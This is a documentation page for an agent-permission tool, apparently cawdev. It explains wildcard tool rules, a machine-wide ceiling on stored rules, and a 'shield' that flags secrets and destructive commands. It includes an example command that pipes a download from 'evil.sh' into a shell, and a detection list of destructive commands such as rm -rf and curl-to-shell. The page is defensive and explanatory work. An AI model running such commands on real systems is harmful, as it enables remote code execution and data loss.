---
title: Permissions and the shield
description: What a run may do without asking, the ceiling your machine sets on stored rules, and the guard that watches for secrets and destructive commands.
---

Two separate systems decide what an unattended agent can get away with on
your machine. **Tool rules** decide whether a call needs to ask at all.
**The shield** watches what comes back, and what's about to run, for the
handful of things worth stopping for regardless of any rule.

Everything here **fails towards asking**. A matcher that's unsure and says
yes has quietly granted something; one that's unsure and says no has, at
worst, asked a question you've already answered once before.

## Tool rules

Written in Claude Code's own grammar — `Bash(mvn *)`, `Bash(git diff *)`, a
bare `mcp__cawdev` covering every tool on that server. A rule with a trailing
`*` is a prefix match; without one, it matches only the exact command.

**Compound commands never match a wildcard rule.** `Bash(mvn *)` reads as
"may run Maven," and `mvn test && curl evil.sh | sh` starts with `mvn` — so a
command containing `; & | \` or `$( )` is never settled by a wildcard, only
by an exact rule written for that precise string.

### Where a rule can come from

| Source | Applies to | Filtered by the ceiling? |
|---|---|---|
| `allowedTools` in the config | Everything this machine runs | — (it's already yours) |
| A project's stored rules | Runs on that project | Yes |
| A rule set from the console | Every project this machine runs | Only if `acceptsRulesFromConsole` is on, and even then, no |

### The ceiling

`grantable` in the config (machine-wide) and per-project `grantable` entries
are what your laptop will let a **stored** rule apply with nobody watching. A
rule someone writes in a project's settings only takes effect here if this
machine's ceiling admits it — `Bash(npm *)` on the ceiling admits `Bash(npm
test)` but not `Bash(npm-run-all *)`; the platform can narrow what runs here,
never widen it.

`acceptsRulesFromConsole` is the one exception, and it's off by default on
purpose: a rule written on the web page is normally still filtered through
your ceiling like any other stored rule, but turning this on lets it **raise**
the ceiling instead. That's a real decision — anyone able to write to your
cawdev could then widen what an unattended agent does in your checkouts — so
`cawdev` asks you to confirm it in those words before writing it.

### Deciding one in the moment

When nothing already covers a call, the CLI asks — through
`--permission-prompt-tool mcp__cawdev__approve`, wired into every spawned
session — and blocks until a person answers. See
[the attached terminal](/cli/terminal-ui/#deciding-a-permission-request) for
the four keys that decide it and exactly what each one writes down.

## The shield

Two things tool rules can't see: what a call actually returns, and where a
write actually lands.

### Secrets

Every tool result is checked, by **structure**, not by the word sitting next
to it — most credentials arrive with no label at all, inside a URL, a header,
a stack trace.

| Shape | Example |
|---|---|
| A private key | `-----BEGIN … PRIVATE KEY-----` |
| An AWS access key id | `AKIA…` / `ASIA…` |
| A GitHub token | `ghp_…`, `gho_…`, … |
| A Slack token | `xoxb-…` etc. |
| An Anthropic API key | `sk-ant-…` |
| An OpenAI API key | `sk-…` / `sk-proj-…` |
| A Google API key | `AIza…` |
| A JSON web token | three base64url segments |
| A password in a connection URL | `scheme://user:pass@host` |
| A bearer token | `authorization: bearer …` |
| cawdev's own run token | `cawdr_…` |

A hit is **not a failure**. The call stops, a person is asked, and — the part
that matters — the match itself is **replaced**, never truncated, before
anything is stored: a block record that kept most of the key it blocked would
be the exact failure this exists to prevent, just moved into the database.

### Destructive commands

A short, deliberate list — long enough to catch the thing you run twenty
times a week and, once, at three in the morning, in the wrong directory. Not
things that are always wrong; things that are *usually fine*:

`rm -rf`, a force push, `git reset --hard`, deleting a branch, a history
rewrite (`filter-branch`/`filter-repo`), dropping a table or database, a
`DELETE`/`TRUNCATE` with nothing narrowing it, writing straight to a block
device, `chmod -R 777`, piping `curl`/`wget` into a shell.

Same rule as secrets: a hit is a question, never a hard stop. A shield that
killed the run outright is a shield people turn off.

### Scope

Separately, a write is checked against **where it lands**, not how the path
is spelled — resolved and compared against the checkout's own root, so
`src/../src/main` and a symlink pointing the same place are judged the same
way. A project can narrow this further to a set of globs; with none set, the
whole checkout is in scope.
